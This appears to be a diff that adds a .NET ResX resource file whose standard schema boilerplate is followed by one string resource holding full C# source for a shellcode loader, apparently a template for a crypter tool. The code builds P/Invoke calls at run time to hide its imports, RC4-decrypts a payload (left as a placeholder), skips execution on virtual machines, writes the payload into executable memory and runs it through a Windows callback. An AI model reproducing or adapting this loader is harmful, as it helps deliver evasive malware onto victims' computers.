@@ -1,0 +1,248 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="String1" xml:space="preserve">
+    <value>using System;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Management;
+using System.Reflection.Emit;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using Microsoft.VisualBasic.Logging;
+
+namespace v
+{
+    internal static class Module1
+    {
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x00001000,
+            Reserve = 0x00002000,
+            Decommit = 0x00004000,
+            Release = 0x00008000,
+            Reset = 0x00080000,
+            TopDown = 0x00100000,
+            WriteWatch = 0x00200000,
+            Physical = 0x00400000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            NoAccess = 0x0001,
+            ReadOnly = 0x0002,
+            ReadWrite = 0x0004,
+            WriteCopy = 0x0008,
+            Execute = 0x0010,
+            ExecuteRead = 0x0020,
+            ExecuteReadWrite = 0x0040,
+            ExecuteWriteCopy = 0x0080,
+            GuardModifierflag = 0x0100,
+            NoCacheModifierflag = 0x0200,
+            WriteCombineModifierflag = 0x0400
+        }
+        public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
+        {
+            AssemblyName assemblyName = new AssemblyName("Temp01");
+            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
+            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");
+
+            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, paramTypes, CallingConvention.Winapi, CharSet.Ansi);
+
+            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
+            moduleBuilder.CreateGlobalFunctions();
+
+            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
+            object res = dynamicMethod.Invoke(null, args);
+            return res;
+        }
+
+        public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
+        {
+            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(AllocationType), typeof(MemoryProtection) };
+            Object[] args = { lpAddress, dwSize, flAllocationType, flProtect };
+            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "VirtualAlloc", args, paramTypes);
+            return (IntPtr)res;
+        }
+
+        [DllImport("kernel32.dll")]
+        private static extern bool EnumUILanguagesA(IntPtr lpUILanguageEnumProc, uint dwFlags, IntPtr lParam);
+
+        public static byte[] RC4decrypt(byte[] D1, string D2)
+        {
+            byte[] D3 = System.Text.Encoding.ASCII.GetBytes(D2);
+            uint D4 = 0;
+            uint D5 = 0;
+            uint D6 = 0;
+            uint[] D7 = new uint[256];
+            byte[] D8 = new byte[D1.Length];
+            for (D4 = 0; D4 &lt;= 255; D4++)
+            {
+                D7[D4] = D4;
+            }
+            for (D4 = 0; D4 &lt;= 255; D4++)
+            {
+                D5 = (D5 + D3[D4 % D3.Length] + D7[D4]) &amp; 255;
+                D6 = D7[D4];
+                D7[D4] = D7[D5];
+                D7[D5] = D6;
+            }
+            D4 = 0;
+            D5 = 0;
+            for (var D9 = 0; D9 &lt; D8.Length; D9++)
+            {
+                D4 = (D4 + 1) &amp; 255;
+                D5 = (D5 + D7[D4]) &amp; 255;
+                D6 = D7[D4];
+                D7[D4] = D7[D5];
+                D7[D5] = D6;
+                D8[D9] = Convert.ToByte(D1[D9] ^ D7[(D7[D4] + D7[D5]) &amp; 255]);
+            }
+            return D8;
+        }
+        static void Main()
+        {
+            if (IsVM())
+            {
+                return;
+            }
+            byte[] ont = { lol };
+            byte[] Xpayload = RC4decrypt(ont, "kkkkk");
+            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
+            Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
+            EnumUILanguagesA(p, 0, IntPtr.Zero);
+        }
+
+        public static bool IsVM()
+        {
+            return !((from o in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get()
+                             .OfType&lt;ManagementObject&gt;()
+                      select (uint)o.GetPropertyValue("ProductType")).First() != 1U ||
+                     !(new ManagementObjectSearcher("Select * from Win32_CacheMemory").Get().OfType&lt;ManagementObject&gt;()
+                         .ToList()
+                         .Count &lt; 2));
+        }
+    }
+}</value>
+  </data>
+</root>
